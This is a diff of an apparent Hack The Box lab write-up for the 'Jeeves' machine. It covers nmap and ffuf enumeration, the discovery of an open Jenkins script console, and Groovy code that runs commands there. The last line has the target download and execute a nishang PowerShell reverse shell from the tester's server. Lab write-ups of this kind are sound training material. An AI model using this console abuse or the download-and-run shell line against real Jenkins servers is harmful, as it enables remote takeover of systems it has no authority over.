@@ -1,14 +1,18 @@
 
 # Jeeves
+- Introduction
+- Summary
 - Walkthrough
 - Mitigrations
 - References
 
+## Introduction
+
+
 
 ## Jeeves
 
-The tester starteed with an nmap scan to enumerate the host.
-
+The tester starteed with an nmap scan to enumerate the hosts services.
 
 ```
 └──╼ [★]$ nmap -sC -sV -p 80,135,445,50000 10.10.10.63
@@ -49,7 +53,6 @@ Nmap done: 1 IP address (1 host up) scanned in 46.88 seconds
 
 The scan showed that a web service was running on port 50000. The tester used ffuf to bruteforce the directories. 
 
-
 ```
 └──╼ [★]$ ffuf -w '/home/rang3r/Documents/Tools/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt'  -u http://10.10.10.63:50000/FUZZ -e .txt,.asp,.aspx,.config,.html
 
@@ -79,16 +82,9 @@ ________________________________________________
 
 :: Progress: [1245858/1245858] :: Job [1/1] :: 970 req/sec :: Duration: [0:23:13] :: Errors: 0 ::
 
-
 ```
 
-The ffuf found the "askjeeves" directory. The endpoint is running the jenkins service. Jenkins has a script console that allows user to run "groovy" scripts on the server.
-
-
-insert image of console---------------------
-
-
-The tester used the following scipt to test code execution:
+The ffuf found the "askjeeves" endpoint. This showned that the host is running the jenkins service. Jenkins has a script console that allows user to run "groovy" scripts on the server. The tester used the following script to test code execution:
 
 ```
 def process = "whoami".execute()
@@ -105,7 +101,7 @@ Output: jeeves\kohsuke
 Exit code: 0
 ```
 
-The tester next gained a shell on the host by downloading and invoking a powershell shell. The Tester used the nishang tool set that contained a series of powershell shells. The tester set up a HTTP server using python and a Netcat listener then used the beolow script to download and run the shell.
+The tester next started a shell on the host by downloading and invoking [this](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) powershell script. The tester set up a HTTP server using python and a Netcat listener then used the beolow script to download and run the shell.
 
 ```
 def process = "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6:8083/Invoke-PowerShellTcp.ps1')".execute()
